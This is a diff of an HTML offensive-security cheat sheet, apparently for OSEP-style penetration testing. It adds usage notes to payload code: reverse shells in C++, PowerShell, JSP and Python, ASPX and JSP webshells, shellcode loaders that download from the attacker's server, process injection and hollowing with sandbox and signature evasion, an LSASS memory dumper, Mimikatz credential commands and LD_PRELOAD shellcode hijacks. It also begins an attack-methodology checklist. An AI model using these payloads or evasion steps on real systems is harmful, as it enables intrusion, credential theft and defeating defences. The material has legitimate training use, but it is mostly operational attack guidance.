@@ -42,30 +42,30 @@
   <meta name="twitter:image" content="./img/favicon.png">
   <style>
   /* Index sidebar color flow (light → dark) */
-  .section-flow-1{background-color:#f3fbf6;}
-  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#f3fbf6;}
-  .section-flow-2{background-color:#e7f6ec;}
-  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#e7f6ec;}
-  .section-flow-3{background-color:#d2e6d9;}
-  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#d2e6d9;}
-  .section-flow-4{background-color:#bdd5c6;}
-  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#bdd5c6;}
-  .section-flow-5{background-color:#a8c5b3;}
-  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#a8c5b3;}
-  .section-flow-6{background-color:#93b5a0;}
-  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#93b5a0;}
-  .section-flow-7{background-color:#7ea48c;}
-  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#7ea48c;}
-  .section-flow-8{background-color:#689479;}
-  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#689479;}
-  .section-flow-9{background-color:#538466;}
-  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#538466;}
-  .section-flow-20{background-color:#3e7453;}
-  .section-flow-20 .dropdown-container,.section-flow-20 .nested-dropdown-container{background-color:#3e7453;}
-  .section-flow-21{background-color:#296340;}
-  .section-flow-21 .dropdown-container,.section-flow-21 .nested-dropdown-container{background-color:#296340;}
-  .section-flow-22{background-color:#14532d;}
-  .section-flow-22 .dropdown-container,.section-flow-22 .nested-dropdown-container{background-color:#14532d;}
+  .section-flow-1{background-color:#f3f7f4;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#f3f7f4;}
+  .section-flow-2{background-color:#afd9c0;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#afd9c0;}
+  .section-flow-3{background-color:#6dcd95;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#6dcd95;}
+  .section-flow-4{background-color:#34cb73;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#34cb73;}
+  .section-flow-5{background-color:#25b360;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#25b360;}
+  .section-flow-6{background-color:#1ea657;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#1ea657;}
+  .section-flow-7{background-color:#1ea657;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#1ea657;}
+  .section-flow-8{background-color:#25b360;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#25b360;}
+  .section-flow-9{background-color:#34cb73;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#34cb73;}
+  .section-flow-20{background-color:#6dcd95;}
+  .section-flow-20 .dropdown-container,.section-flow-20 .nested-dropdown-container{background-color:#6dcd95;}
+  .section-flow-21{background-color:#afd9c0;}
+  .section-flow-21 .dropdown-container,.section-flow-21 .nested-dropdown-container{background-color:#afd9c0;}
+  .section-flow-22{background-color:#f3f7f4;}
+  .section-flow-22 .dropdown-container,.section-flow-22 .nested-dropdown-container{background-color:#f3f7f4;}
   </style>
 </head>
 
@@ -230,6 +230,7 @@ impacket-smbserver share . -smb2support</code></pre>
 
 <h2 id="scanning">2. Reconnaissance</h2>
 <h3 id="scanning-external-scanning-nmap">2.1 External Scanning - Nmap</h3>
+<p>Nmap scanning progression: start fast and broad (<code>-p-</code>) to find open ports, then focus with version detection (<code>-sV -sC</code>) on discovered ports. Each flag trades speed for depth.</p>
 <pre><code class="language-bash"># Advanced enumeration (OS + version)
 nmap -A [ip] -oN [machine].txt
 
@@ -350,6 +351,7 @@ Sub DocumentOpen()
     SendProcessInfo
 End Sub
 </code></pre>
+<p>Alternative architecture-detection macro: queries WMI for the <code>explorer.exe</code> process path to determine if the target is 64-bit, then POSTs the result as JSON to the attacker&rsquo;s listener. Use this to choose between x86 and x64 payloads before delivering the real shellcode.</p>
 <pre><code class="language-csharp">Option Explicit
 
 Sub SendProcessInfo()
@@ -1520,6 +1522,7 @@ int main() {
 <pre><code class="language-bash">.\rev.exe [ip] [port]
 </code></pre>
 
+<p>C++ reverse shell accepting IP and port as CLI arguments. Initialises Winsock, connects to the attacker, then spawns <code>cmd.exe</code> with stdin/stdout/stderr redirected to the socket.</p>
 <pre><code class="language-cpp">#include &lt;winsock2.h&gt;
 #include &lt;windows.h&gt;
 #include &lt;ws2tcpip.h&gt;
@@ -1860,6 +1863,7 @@ i686-w64-mingw32-gcc -shared -oadduser32.dll adduser.c -lnetapi32
 x86_64-w64-mingw32-gcc -shared -oadduser64.dll adduser.c -lnetapi32
 </code></pre>
 
+<p>Minimal DLL that runs <code>net user</code> / <code>net localgroup</code> on load. Use for DLL hijacking or side-loading: drop this as a missing DLL name in a privileged service&rsquo;s search path, then restart the service to get a local admin account.</p>
 <pre><code class="language-cpp">#include &lt;stdlib.h&gt;
 #include &lt;windows.h&gt;
 
@@ -1887,6 +1891,7 @@ LPVOID lpReserved )
 </code></pre>
 <h4 id="initial-further-access-powershell">3.2.3 PowerShell</h4>
 <h4 id="initial-further-access-powershell-obfuscated-reverse-shell">3.2.4 Obfuscated Reverse Shell</h4>
+<p>Two levels of PowerShell reverse shells: Option 1 is a simple TCP client that reads commands, executes via <code>iex</code>, and returns output with a PS prompt. Option 2 adds variable-name obfuscation and IP encoding (e.g. <code>10x10x10x10_443</code>) to evade static string signatures.</p>
 <pre><code class="language-powershell"># Option 1
 $amit = New-Object System.Net.Sockets.TCPClient("[ip]",[port]);
 $amit = $amit.GetStream();
@@ -1940,6 +1945,7 @@ try {
 <pre><code class="language-bash"># 32-bit variant: windows/meterpreter/reverse_http
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=[port] EXITFUNC=thread -f ps1
 </code></pre>
+<p>Reflective shellcode loader entirely in PowerShell. Uses dynamic P/Invoke: resolves <code>VirtualAlloc</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code> at runtime via <code>GetProcAddress</code> reflection (no static <code>DllImport</code>). This avoids script-block logging signatures that match known P/Invoke patterns. Replace the <code>$buf</code> array with msfvenom output.</p>
 <pre><code class="language-powershell"># Reflective loader — VirtualAlloc + CreateThread via dynamic P/Invoke
 function getDelegateType {
     Param (
@@ -2004,6 +2010,7 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://[ip]/PowerVi
 <h4 id="initial-further-access-webshells-aspx">3.2.8 ASPX</h4>
 <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=443 -f aspx -o pay.aspx
 </code></pre>
+<p>Caesar-shift encoder (+5) and its matching ASPX webshell loader. First compile and run the encoder against raw msfvenom shellcode to produce the shifted byte array, then paste the output into the ASPX shell&rsquo;s <code>oe7hnH0[]</code> array. The webshell decodes at runtime (<code>-5</code>), allocates RWX memory via <code>VirtualAlloc</code>, and executes the shellcode in a new thread. A <code>VirtualAllocExNuma</code> pre-check acts as a sandbox evasion gate.</p>
 <pre><code class="language-csharp">// Caesar +5 encoder — encode shellcode before embedding in ASPX
 using System;
 using System.Text;
@@ -2073,6 +2080,7 @@ iwr -uri http://[ip]/[name].aspx -o C:\inetpub\wwwroot\[payload].aspx
 </code></pre>
 
 <h4 id="initial-further-access-webshells-jsp">3.2.9 JSP</h4>
+<p>JSP reverse shell: takes <code>ipaddress</code> and <code>port</code> as GET parameters, opens a TCP socket to the attacker, and bridges the socket I/O to a <code>cmd.exe</code> process via two <code>StreamConnector</code> threads (one for stdin, one for stdout). Deploy to a writable webapp directory and trigger with <code>curl "http://target/shell.jsp?ipaddress=[ip]&amp;port=[port]"</code>.</p>
 <pre><code class="language-java"><%@
 page import="java.lang.*, java.util.*, java.io.*, java.net.*"
 %>
@@ -2133,6 +2141,7 @@ if(ipAddress != null &amp;&amp; ipPort != null)
 }
 %>
 </code></pre>
+<p>Hybrid JSP shell with two modes: a reverse TCP connection (set IP/port in the source) and an HTML form fallback for direct command execution through the browser. Cross-platform: auto-detects Windows (<code>cmd.exe</code>) vs Linux (<code>/bin/sh</code>).</p>
 <pre><code class="language-java">// Two-way shell: reverse TCP + HTML form fallback. Set ip/port below.
 <%@page import="java.lang.*"%>
 <%@page import="java.io.*"%>
@@ -3014,6 +3023,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 $assem.EntryPoint.Invoke($null, @([string[]]@()))
 </code></pre>
 
+<p>C# process injector with API obfuscation. Resolves <code>CreateProcessA</code>, <code>WriteProcessMemory</code>, and <code>VirtualAllocEx</code> at runtime via <code>GetProcAddress</code> using byte-array-encoded function names (avoids static import strings). Downloads raw shellcode from the attacker&rsquo;s HTTP server, spawns a suspended <code>notepad.exe</code>, allocates RWX memory in the target, writes the shellcode, and starts a remote thread to execute it. The 10-second <code>Sleep</code> at the start is a basic sandbox evasion check.</p>
 <pre><code class="language-csharp">using System;
 using System.Diagnostics;
 using System.Net;
@@ -3126,6 +3136,7 @@ $method = $class.GetMethod("PerformProcessHollowing")
 $method.Invoke($null, $null)
 </code></pre>
 
+<p>Process hollowing DLL: spawns <code>svchost.exe</code> in a suspended state via <code>CreateProcessA</code> with <code>CREATE_SUSPENDED</code>, uses <code>ZwQueryInformationProcess</code> to locate the PEB and image base, parses the PE header to find the entry point RVA, overwrites it with XOR-decoded shellcode via <code>WriteProcessMemory</code>, then resumes the thread. Loaded reflectively from PowerShell (see the loader above) so the DLL never touches disk.</p>
 <pre><code class="language-csharp">using System;
 using System.Runtime.InteropServices;
 
@@ -5768,6 +5779,7 @@ Invoke-Mimikatz -Command '"!processprotect /process:lsass.exe /remove"'
 # All-in-one dump
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch" "lsadump::sam" "sekurlsa::credman" "sekurlsa::ssp" "sekurlsa::wdigest" "sekurlsa::logonpasswords" "lsadump::secrets"'
 </code></pre>
+<p>Individual Mimikatz credential-extraction commands. Each targets a different credential store: <code>vault::cred</code> for Credential Manager / scheduled task passwords, <code>sekurlsa::logonpasswords</code> for logged-on NTLM hashes, <code>lsadump::sam</code> for local SAM accounts, <code>lsadump::secrets</code> for LSA service-account secrets, <code>sekurlsa::ekeys</code> for Kerberos encryption keys, <code>sekurlsa::credman</code> for Credential Manager plaintext, <code>sekurlsa::ssp</code> for SSP credentials, and <code>sekurlsa::wdigest</code> for WDigest plaintext (pre-Win10 or when <code>UseLogonCredential=1</code>).</p>
 <pre><code class="language-powershell"># Scheduled task passwords
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'
 
@@ -5931,6 +5943,7 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 <pre><code class="language-powershell"># Native, tool-less dump: comsvcs.dll MiniDump (run elevated; [pid] = lsass PID)
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [pid] C:\Windows\Tasks\lsass.dmp full
 </code></pre>
+<p>Custom LSASS dumper using <code>MiniDumpWriteDump</code> from <code>Dbghelp.dll</code>. Opens LSASS with <code>PROCESS_ALL_ACCESS</code>, writes a full memory dump to disk. Useful when <code>procdump.exe</code> and <code>comsvcs.dll</code> are blocked by EDR rules. Compile with <code>csc /platform:x64 MiniDump.cs</code> and run elevated. Parse the resulting dump offline with <code>mimikatz sekurlsa::minidump</code>.</p>
 <pre><code class="language-csharp">// MiniDump.exe — custom MiniDumpWriteDump of LSASS (run elevated)
 using System;
 using System.Diagnostics;
@@ -6123,6 +6136,7 @@ echo 'import socket,subprocess,os;s=socket.socket();s.connect(("[ip]",4444));os.
 
 <h4 id="linux-initial-access-payloads-xor-encoder">6.1.4 XOR Payload Encoder</h4>
 
+<p>XOR-encodes raw msfvenom shellcode with key <code>0xfa</code> and prints the result as a C-style byte string. Paste the output into the simple loader (next section) or the LD_PRELOAD / LD_LIBRARY_PATH shared library payloads below.</p>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
@@ -6156,6 +6170,7 @@ int main (int argc, char **argv)
 
 <h4 id="linux-initial-access-payloads-simple-loader">6.1.5 Simple Loader</h4>
 
+<p>Decodes the XOR-encoded shellcode (key <code>0xfa</code>) in-place, then casts the buffer to a function pointer and calls it. Requires <code>-z execstack</code> at compile time because the shellcode lives in the <code>.data</code> section (non-executable by default).</p>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
@@ -6185,6 +6200,7 @@ int main (int argc, char **argv)
 
 <h4 id="linux-initial-access-payloads-ld-preload">6.1.6 Shared Library LD PRELOAD</h4>
 
+<p>Hijacks <code>geteuid()</code> via <code>LD_PRELOAD</code>. When a SUID binary calls <code>geteuid()</code>, this .so intercepts it: forks a child that decodes and executes shellcode (using <code>mprotect</code> to mark the buffer executable), while the parent calls the real <code>geteuid()</code> so the host program continues normally. Load with <code>LD_PRELOAD=./evil.so /usr/bin/suid_binary</code>.</p>
 <pre><code class="language-c">#define _GNU_SOURCE
 #include &lt;sys/mman.h&gt;
 #include &lt;stdlib.h&gt;
@@ -6239,6 +6255,7 @@ uid_t geteuid(void)
 
 <h4 id="linux-initial-access-payloads-ld-library-path">6.1.7 Shared Library LD LIBRARY Path</h4>
 
+<p>Library-path hijack variant using a GCC <code>__attribute__((constructor))</code> so the payload runs automatically when the .so is loaded (no function-name hooking needed). Exports dummy symbols (<code>gpgrt_onclose</code>, <code>gpgrt_poll</code>) to satisfy the linker when replacing <code>libgpg-error.so</code> or similar. Calls <code>setuid(0)/setgid(0)</code> to escalate if the loading process is SUID, then XOR-decodes and executes shellcode via <code>mprotect</code> + function-pointer cast.</p>
 <pre><code class="language-c">#include &lt;sys/mman.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
@@ -7202,6 +7219,7 @@ bloodhound
 </code></pre>
 
 <h4 id="ad-enum-ldap-ldapsearch">8.2.2 ldapsearch</h4>
+<p>Progressive LDAP queries: start unauthenticated to check if anonymous bind is allowed, then authenticate to pull users, computers, and group memberships. The <code>-b</code> flag sets the search base (domain DN), <code>-s base</code> queries the root DSE, and object-class filters narrow results.</p>
 <pre><code class="language-bash"># Anonymous base query
 ldapsearch -x -h [ip] -s base
 
@@ -7477,6 +7495,7 @@ Convert-ADName -ObjectName S-1-5-21-...-1724
 Get-DomainUser [user] | ConvertFrom-UACValue -ShowAll</code></pre>
 
 <h4 id="ad-enum-powerview-users-groups">8.4.2 Users &amp; Groups</h4>
+<p>PowerView user and group enumeration: start broad (<code>Get-DomainUser</code>), then filter for high-value targets &mdash; AS-REP roastable (<code>-KerberosPreauthNotRequired</code>), Kerberoastable (<code>-SPN</code>), delegation-trusted, and stale passwords. Export to CSV for offline triage when the domain is large.</p>
 <pre><code class="language-powershell"># All users / a single user, count
 Get-DomainUser
 (Get-DomainUser).count
@@ -7609,6 +7628,7 @@ nxc smb [ip] -u users.txt -p '[password]' --continue-on-success
 nxc winrm [ip] -u users.txt -p pass.txt --no-bruteforce --continue-on-success</code></pre>
 
 <h4 id="ad-enum-netexec-enumeration">8.5.2 Enumeration</h4>
+<p>NetExec SMB enumeration: a bare sweep with no credentials still leaks OS version, hostname, domain, and SMB signing status. Add credentials to enumerate domain objects (users, groups, computers), shares, sessions, and logged-on users. The <code>--gen-relay-list</code> flag exports hosts with SMB signing disabled &mdash; relay targets.</p>
 <pre><code class="language-bash"># Recon: a bare SMB sweep yields OS, hostname, domain, signing, SMBv1
 nxc smb [ip]/24
 nxc smb [ip]/24 --gen-relay-list relay.txt     # hosts with SMB signing disabled
@@ -7636,6 +7656,7 @@ nxc smb [ip] -u [user] -p [password] --wmi "SELECT Caption,ProcessId FROM Win32_
 nxc smb [dc-ip] -u '' -p '' --pass-pol --export $(pwd)/passpol.txt</code></pre>
 
 <h4 id="ad-enum-netexec-protocols-bloodhound">8.5.3 Protocol Modes, Roasting &amp; BloodHound</h4>
+<p>NetExec LDAP mode for Kerberos attacks: <code>--asreproast</code> dumps AS-REP hashes (hashcat mode 18200) for accounts without pre-auth, <code>--kerberoasting</code> dumps TGS hashes (hashcat mode 13100) for SPN-holding users. Also test WinRM and MSSQL with the same credentials &mdash; <code>(Pwn3d!)</code> in WinRM output means command execution is available.</p>
 <pre><code class="language-bash"># LDAP: AS-REP roast / Kerberoast straight to hashcat-ready files
 nxc ldap [dc-ip] -u users.txt -p '' --asreproast asreproast.out      # hashcat -m 18200
 nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting kerb.out    # hashcat -m 13100
@@ -9976,6 +9997,7 @@ stage-listener --url tcp://[attacker-ip]:[stage-port] --profile [profile-name]
 # 3. Start HTTP C2 listener
 http -L [attacker-ip] -l [c2-port]
 </code></pre>
+<p>Nim shellcode loader: downloads raw shellcode over HTTP, allocates RWX memory in the current process via <code>VirtualAllocEx</code>, copies the shellcode in, and casts the memory to a function pointer to execute it. Nim compiles to a native PE with no .NET dependency, making it useful when .NET-based loaders are blocked.</p>
 <pre><code class="language-nim">import winim/lean
 import httpclient
 
@@ -10278,234 +10300,1699 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
 </code></pre>
 
 <h2 id="methodology">11. Methodology</h2>
-<h3 id="methodology-recon">11.1 Reconnaissance &amp; Scanning</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-scan"> Full TCP/UDP scan of every in-scope host (<code>nmap</code>); map all services and entry points</li>
-  <li><input type="checkbox" data-id="osep-enum"> Enumerate each exposed service (web, SMB, MSSQL, mail) for an initial foothold</li>
-  <li><input type="checkbox" data-id="osep-surface"> Identify the external attack surface and any client-side opportunities</li>
-  <li><input type="checkbox" data-id="osep-scope"> Confirm scope, in-scope IP ranges/domains, and rules of engagement before touching anything</li>
-  <li><input type="checkbox" data-id="osep-passive"> Passive recon: gather email addresses, employee names, and naming conventions (OSINT, LinkedIn, breach data) for phishing and password spraying</li>
-  <li><input type="checkbox" data-id="osep-dns-enum"> Enumerate DNS: zone transfers, subdomains, MX/SPF/DMARC records, and external mail gateways</li>
-  <li><input type="checkbox" data-id="osep-web-enum"> Fingerprint web apps (tech stack, CMS, frameworks, upload functions, auth portals) for an exploitable entry</li>
-  <li><input type="checkbox" data-id="osep-smb-enum"> Enumerate SMB shares, null sessions, and accessible files for credentials and internal recon data</li>
-  <li><input type="checkbox" data-id="osep-vhost"> Enumerate virtual hosts and TLS certificate SANs to discover additional services and internal hostnames</li>
-  <li><input type="checkbox" data-id="osep-version"> Record exact software versions; map each to known CVEs and public exploits</li>
-</ul>
-<h3 id="methodology-initial">11.2 Initial Access &amp; Client-Side Execution</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-phish"> Craft a client-side payload (Word macro / HTA / JScript) tailored to bypass AV &amp; AMSI</li>
-  <li><input type="checkbox" data-id="osep-runner"> Use a custom <strong>encrypted shellcode runner</strong> (C#, VBA, PowerShell) instead of raw msfvenom output</li>
-  <li><input type="checkbox" data-id="osep-inject"> Add sandbox/AV checks, parent-PID spoofing, and process injection / migration into a trusted process</li>
-  <li><input type="checkbox" data-id="osep-callback"> Deliver the payload and catch the initial (encrypted) callback; upgrade to a stable C2 / shell</li>
-  <li><input type="checkbox" data-id="osep-pretext"> Build a believable pretext and lure (invoice, HR notice, IT update) matched to the target organization</li>
-  <li><input type="checkbox" data-id="osep-delivery"> Choose a delivery channel that survives the mail gateway/proxy (link vs attachment, password-protected archive, HTTPS-hosted stager)</li>
-  <li><input type="checkbox" data-id="osep-stager-host"> Stand up a staging/redirector server with valid TLS to host the second stage cleanly</li>
-  <li><input type="checkbox" data-id="osep-trust-prompt"> Minimize trust prompts: signed containers, mark-of-the-web stripping, trusted file types</li>
-  <li><input type="checkbox" data-id="osep-app-exploit"> Where a service is vulnerable, gain code execution directly (web shell, deserialization, file upload, SSTI, RCE) as an alternative to client-side</li>
-  <li><input type="checkbox" data-id="osep-foothold-validate"> Validate the foothold: confirm user context, host, integrity level, and outbound connectivity</li>
-</ul>
-<h3 id="methodology-evasion">11.3 Antivirus &amp; Defense Evasion</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-enum-def"> Enumerate defenses: AV/EDR, AMSI, AppLocker, Constrained Language Mode (CLM), Defender</li>
-  <li><input type="checkbox" data-id="osep-amsi"> Bypass AMSI (in-memory patch / reflection) before loading PowerShell tooling</li>
-  <li><input type="checkbox" data-id="osep-applocker"> Bypass AppLocker / CLM via LOLBAS (InstallUtil, MSBuild, regsvr32), trusted folders, or custom runspaces</li>
-  <li><input type="checkbox" data-id="osep-obfuscate"> Encrypt / obfuscate shellcode &amp; stagers (XOR, AES, custom loaders) to defeat static signatures</li>
-  <li><input type="checkbox" data-id="osep-blind"> Blind defenses where possible: disable PPL for LSASS, patch ETW, remove Defender signatures</li>
-  <li><input type="checkbox" data-id="osep-edr-recon"> Identify the specific EDR/AV product and its hooks (loaded DLLs, drivers, services) before choosing an evasion path</li>
-  <li><input type="checkbox" data-id="osep-unhook"> Unhook userland API hooks by reloading a clean ntdll/kernel32 from disk or a known-good copy</li>
-  <li><input type="checkbox" data-id="osep-direct-syscall"> Use direct/indirect syscalls (Hell's Gate / Halo's Gate / Syswhispers) to bypass userland hooks for injection primitives</li>
-  <li><input type="checkbox" data-id="osep-etw-patch"> Patch ETW (<code>EtwEventWrite</code>) in-process to suppress .NET / CLR telemetry before loading assemblies</li>
-  <li><input type="checkbox" data-id="osep-amsi-providers"> Account for AMSI in non-PowerShell contexts (WSH/JScript, Excel 4.0/XLM, .NET assembly load)</li>
-  <li><input type="checkbox" data-id="osep-clm-bypass"> Escape Constrained Language Mode via custom runspaces, InstallUtil, or downgrade to PowerShell v2</li>
-  <li><input type="checkbox" data-id="osep-signed"> Sign payloads / use trusted-publisher or LOLBAS execution to satisfy WDAC/AppLocker publisher rules</li>
-  <li><input type="checkbox" data-id="osep-sleep"> Add sleep masks, jitter, and encrypted beacons to evade in-memory and network detection</li>
-  <li><input type="checkbox" data-id="osep-defender-test"> Test the final artifact against Defender/EDR offline (AMSITrigger, ThreatCheck, DefenderCheck) to locate and fix flagged bytes</li>
-</ul>
-<h3 id="methodology-tunneling">11.4 Tunneling &amp; Pivoting</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-tunnel"> Establish a foothold tunnel (Ligolo-ng, sshuttle, or Metasploit routing / portfwd)</li>
-  <li><input type="checkbox" data-id="osep-map"> Map reachable internal subnets and pivot deeper as you move</li>
-  <li><input type="checkbox" data-id="osep-proxy"> Forward ports / use proxychains for tooling that can't route natively</li>
-  <li><input type="checkbox" data-id="osep-double-pivot"> Chain multiple pivots (double/triple hop) as you reach deeper segments and isolated VLANs</li>
-  <li><input type="checkbox" data-id="osep-local-fwd"> Local and remote port forwards to reach single services (RDP, MSSQL, WinRM) behind the pivot</li>
-  <li><input type="checkbox" data-id="osep-socks"> Stand up a SOCKS proxy for browser/tooling access to internal web apps and dashboards</li>
-  <li><input type="checkbox" data-id="osep-pivot-c2"> Route C2 traffic through the pivot host or use SMB/named-pipe peer-to-peer beacons in segmented networks</li>
-  <li><input type="checkbox" data-id="osep-internal-scan"> Re-scan from the new vantage point; internal hosts often expose far more than the perimeter</li>
-</ul>
-<h3 id="methodology-privesc">11.5 Privilege Escalation</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-sa"> Situational awareness: <code>whoami /all</code>, privileges, users, groups, software, services</li>
-  <li><input type="checkbox" data-id="osep-win-pe"> Windows: token abuse (SeImpersonate &rarr; Potato), AlwaysInstallElevated, service/binary hijacks, UAC bypass</li>
-  <li><input type="checkbox" data-id="osep-lin-pe"> Linux: SUID / capabilities, sudo rules, cron jobs, writable services, kernel exploits</li>
-  <li><input type="checkbox" data-id="osep-winpeas"> Run automated enumeration (WinPEAS/LinPEAS/Seatbelt/PowerUp) and triage the findings</li>
-  <li><input type="checkbox" data-id="osep-unquoted"> Check unquoted service paths, weak service permissions, and modifiable service binaries/registry</li>
-  <li><input type="checkbox" data-id="osep-dll-hijack"> Hunt DLL hijacking / DLL search-order opportunities in privileged or auto-running processes</li>
-  <li><input type="checkbox" data-id="osep-token-priv"> Enumerate token privileges (SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug) and abuse the relevant one</li>
-  <li><input type="checkbox" data-id="osep-scheduled"> Inspect scheduled tasks, startup items, and autoruns for writable targets</li>
-  <li><input type="checkbox" data-id="osep-stored-creds"> Search for stored credentials in files, registry, GPP, and the Credential Manager for a quick win</li>
-  <li><input type="checkbox" data-id="osep-uac"> Bypass UAC to move from medium to high integrity when you control a local admin user</li>
-  <li><input type="checkbox" data-id="osep-lin-path"> Linux: writable PATH, library hijacking (LD_PRELOAD/LD_LIBRARY_PATH), and misconfigured NFS/root squashing</li>
-</ul>
-<h3 id="methodology-credentials">11.6 Credential Access</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-mimikatz"> Dump credentials from LSASS / SAM with Mimikatz (disable PPL if required)</li>
-  <li><input type="checkbox" data-id="osep-harvest"> Harvest from the registry, DPAPI, browsers, and configuration files</li>
-  <li><input type="checkbox" data-id="osep-crack"> Crack captured hashes offline; spray valid credentials across the domain</li>
-  <li><input type="checkbox" data-id="osep-comsvcs"> Dump LSASS stealthily (comsvcs.dll MiniDump, nanodump, or process-clone) and parse the dump offline</li>
-  <li><input type="checkbox" data-id="osep-dpapi"> Decrypt DPAPI-protected secrets (masterkeys, vaults, browser/Wi-Fi/RDP creds) using the user or domain backup key</li>
-  <li><input type="checkbox" data-id="osep-lsa-secrets"> Extract LSA secrets, cached domain logons (DCC2/mscash), and service account passwords from SAM/SECURITY hives</li>
-  <li><input type="checkbox" data-id="osep-spray"> Password-spray validated credentials/patterns carefully, respecting lockout policy</li>
-  <li><input type="checkbox" data-id="osep-token-impersonate"> Enumerate and impersonate available access tokens of higher-privileged logged-on users</li>
-  <li><input type="checkbox" data-id="osep-keylog-clip"> Capture credentials via clipboard, keylogging, or a fake auth prompt where appropriate</li>
-  <li><input type="checkbox" data-id="osep-gMSA"> Read gMSA passwords where the foothold account is authorized (ReadGMSAPassword)</li>
-</ul>
-<h3 id="methodology-lateral">11.7 Lateral Movement</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-pth"> Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash to reach new hosts</li>
-  <li><input type="checkbox" data-id="osep-exec"> Execute remotely via PsExec / WMI / WinRM / scheduled tasks</li>
-  <li><input type="checkbox" data-id="osep-relay"> Relay attacks (<code>ntlmrelayx</code>) where SMB signing is not enforced</li>
-  <li><input type="checkbox" data-id="osep-bh-path"> Use BloodHound to pick the shortest path to a new privileged host or session</li>
-  <li><input type="checkbox" data-id="osep-dcom"> Move laterally via DCOM (MMC20, ShellWindows) when SMB/WMI are blocked or monitored</li>
-  <li><input type="checkbox" data-id="osep-rdp-lat"> Hijack RDP sessions / use restricted-admin RDP with a hash where interactive access is needed</li>
-  <li><input type="checkbox" data-id="osep-coerce"> Coerce authentication (PetitPotam, PrinterBug, Coercer) to feed a relay or capture a hash</li>
-  <li><input type="checkbox" data-id="osep-relay-target"> Relay coerced NTLM to LDAP/LDAPS (RBCD, ADCS) or to MSSQL/SMB to escalate without cracking</li>
-  <li><input type="checkbox" data-id="osep-session-hunt"> Hunt for privileged user sessions to harvest tokens/tickets and move toward DA</li>
-</ul>
-<h3 id="methodology-ad">11.8 Active Directory Attacks</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-ad-enum"> Enumerate the domain with BloodHound, PowerView, and LDAP; map attack paths</li>
-  <li><input type="checkbox" data-id="osep-kerberos"> Kerberos: Kerberoasting, AS-REP roasting, and delegation abuse (unconstrained / constrained / RBCD)</li>
-  <li><input type="checkbox" data-id="osep-acl"> Abuse ACLs and Group Policy to reach Domain Admin</li>
-  <li><input type="checkbox" data-id="osep-dcsync"> DCSync and dump <code>NTDS.dit</code>; establish persistence (Golden / Silver Ticket)</li>
-  <li><input type="checkbox" data-id="osep-spn-enum"> Enumerate SPNs and service accounts; prioritize high-value, crackable Kerberoast targets</li>
-  <li><input type="checkbox" data-id="osep-asrep-enum"> Find accounts without Kerberos pre-auth and AS-REP roast them</li>
-  <li><input type="checkbox" data-id="osep-gpo-abuse"> Abuse writable GPOs / GPO links to push immediate code execution or new local admins</li>
-  <li><input type="checkbox" data-id="osep-laps"> Read LAPS passwords where the account is authorized to recover local admin access</li>
-  <li><input type="checkbox" data-id="osep-silver"> Forge Silver Tickets for targeted service access using a captured service key</li>
-  <li><input type="checkbox" data-id="osep-golden"> Forge a Golden Ticket from the krbtgt hash for domain-wide persistence</li>
-  <li><input type="checkbox" data-id="osep-persist"> Establish durable persistence (skeleton key, DSRM, AdminSDHolder, ACL backdoor) where the objective requires it</li>
-  <li><input type="checkbox" data-id="osep-ntds-offline"> Exfiltrate and parse NTDS.dit offline (secretsdump) to recover every domain hash</li>
-</ul>
-<h3 id="methodology-mssql">11.9 MSSQL Server Attacks</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-mssql-enum"> Authenticate and enumerate SQL instances; check for sysadmin / impersonation rights</li>
-  <li><input type="checkbox" data-id="osep-mssql-exec"> Gain execution via <code>xp_cmdshell</code> or custom CLR assemblies</li>
